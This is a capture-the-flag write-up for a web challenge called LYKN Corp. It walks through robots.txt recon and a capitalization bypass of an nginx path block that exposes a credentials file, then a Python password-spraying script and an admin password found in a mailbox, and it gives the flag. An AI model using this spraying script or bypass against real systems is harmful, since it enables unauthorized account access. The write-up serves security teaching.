---
title: LYKN Corp
date: 2026-07-06
tags:
- web
- LYKNCTF
---

- **Challenge:** LYKN Corp
- **Category:** Web
- **Flag:** `LYKNCTF{081fe1b217e94e7f8d9cd9f4479a3d89}`

---

## My initial read / first impressions

The challenge description says:

```text
Welcome to our company's internal system. We have just launched a new Onboarding portal for new employees.
The system looks very safe and secure, but is it really?

Let's find the secrets hidden inside!
```

Opening the site gives a normal internal mail login page called **LYKN Mail**.

The page source did not contain any obvious credentials, comments, or hidden endpoints. It was just a basic form posting to:

```text
/login
```

So the first step was normal web recon: check common files, hidden routes, static assets, and anything the server might be telling us not to visit.

## Finding the backup directory

Checking `robots.txt` gave the first useful clue:

```bash
curl http://TARGET/robots.txt
```

The response was:

```text
User-agent: *
Disallow: /backup
```

Trying the listed path directly returned a `403 Forbidden`:

```bash
curl -i http://TARGET/backup
```

```http
HTTP/1.1 403 Forbidden
Server: nginx
```

At first that looks like nginx is correctly protecting the directory. However, Linux paths are case-sensitive, and web server rules are not always written carefully enough to account for that.

So I tried changing the capitalization:

```bash
curl -i http://TARGET/Backup/
```

That returned a directory listing:

```html
<h1>Index of /Backup/</h1>
<a href="credentials.txt">credentials.txt</a>
```

So nginx blocked lowercase `/backup`, but the actual directory was capitalized as `/Backup/` and remained publicly accessible.

This is a case-sensitive access control mistake. The server configuration protected one spelling of the path, while the filesystem exposed another.

## Leaking the new employee credentials

The directory contained one file:

```text
/Backup/credentials.txt
```

I downloaded it with:

```bash
curl http://TARGET/Backup/credentials.txt
```

The file contained:

```text
New Employee Credentials
======================
Username: tuan.nguyen
Password: Welcome123!
```

Using those credentials on the login page worked and redirected me to `/dashboard`.

The account belonged to:

```text
Tuan Nguyen
tuan.nguyen@lykn.local
Role: employee
Title: New Employee
```

The Flask session cookie also decoded to:

```python
{
    'name': 'Tuan Nguyen',
    'role': 'employee',
    'title': 'New Employee',
    'username': 'tuan.nguyen'
}
```

The session was signed, so simply changing `employee` to `admin` did not work. The useful path was the mailbox itself.

## Looking through Tuan's inbox

Tuan only had one email. It was an onboarding message from:

```text
minh.le@lykn.local
```

The message itself did not contain the flag or any admin credentials. It was just a normal first-week checklist.

However, the sender gave us another valid internal username:

```text
minh.le
```

Since Tuan's password was the extremely generic onboarding password:

```text
Welcome123!
```

I checked whether the company had reused it for other employees.

## Password reuse

I tested a small list of likely internal usernames against a few common/default passwords.

The important part of the script was:

```python
import re
import requests

BASE = "http://TARGET"

users = [
    "admin",
    "administrator",
    "root",
    "minh.le",
    "hr",
    "it",
    "security",
]

passwords = [
    "Welcome123!",
    "Welcome123",
    "welcome123!",
    "welcome123",
    "Welcome2026!",
    "Password123!",
    "password",
    "admin",
]

flag_re = re.compile(r"LYKN(?:CTF)?\{[^}]+\}")

for username in users:
    for password in passwords:
        session = requests.Session()

        session.post(
            BASE + "/login",
            data={
                "username": username,
                "password": password,
            },
            allow_redirects=False,
            timeout=8,
        )

        dashboard = session.get(
            BASE + "/dashboard",
            allow_redirects=False,
            timeout=8,
        )

        if dashboard.status_code == 200:
            print(f"[+] Valid credentials: {username}:{password}")
```

This found another valid login:

```text
minh.le:Welcome123!
```

So the supposedly temporary onboarding password was reused by a senior employee as well.

Logging in as Minh showed:

```text
Name: Minh Le
Role: employee
Title: Senior Employee
```

## The admin credentials in Minh's inbox

Minh's mailbox contained a much more useful email from the administrator:

```text
Hey Minh,

Heads up — the portal will be down for maintenance tonight from 11 PM to 2 AM.

Also, you asked about the monitoring dashboard earlier. Here's the service account you can use to check logs while I'm on leave next week:

Username: admin
Password: Adm1n_S3cur3_P@ss_2026

Please don't share this around. I'll rotate it when I'm back.

Thanks,
Admin
```

So the admin had sent a privileged service account password through the internal mail system and had not rotated it yet.

The credentials were:

```text
admin
Adm1n_S3cur3_P@ss_2026
```

## Logging in as admin

Logging in with the leaked service account credentials gave access to the admin page.

The session now identified the account as an administrator, and `/admin` returned:

```text
Welcome, Admin!
System Administrator
```

The page also contained the challenge flag:

```html
<code class="flag-value">LYKNCTF{081fe1b217e94e7f8d9cd9f4479a3d89}</code>
```

## Why this works

This challenge is not really one complicated exploit. It is a chain of several realistic security mistakes:

1. `robots.txt` reveals that a backup path exists.
2. nginx blocks `/backup`, but the real directory is `/Backup/`.
3. Directory listing is enabled and exposes `credentials.txt`.
4. The leaked onboarding password is reused by another employee.
5. That employee's inbox contains an unrotated administrator password.
6. The administrator account can access `/admin`, where the flag is displayed.

The first bug gets us into the company as a new employee. From there, password reuse lets us move laterally into a senior employee's account, and the credential stored in that inbox gives us administrator access.

The full chain is:

```text
robots.txt
    -> /backup is blocked
    -> /Backup/ is exposed
    -> credentials.txt
    -> tuan.nguyen / Welcome123!
    -> email from minh.le
    -> password reuse
    -> minh.le / Welcome123!
    -> admin credentials in inbox
    -> admin / Adm1n_S3cur3_P@ss_2026
    -> /admin
    -> flag
```

## Flag

```text
LYKNCTF{081fe1b217e94e7f8d9cd9f4479a3d89}
```
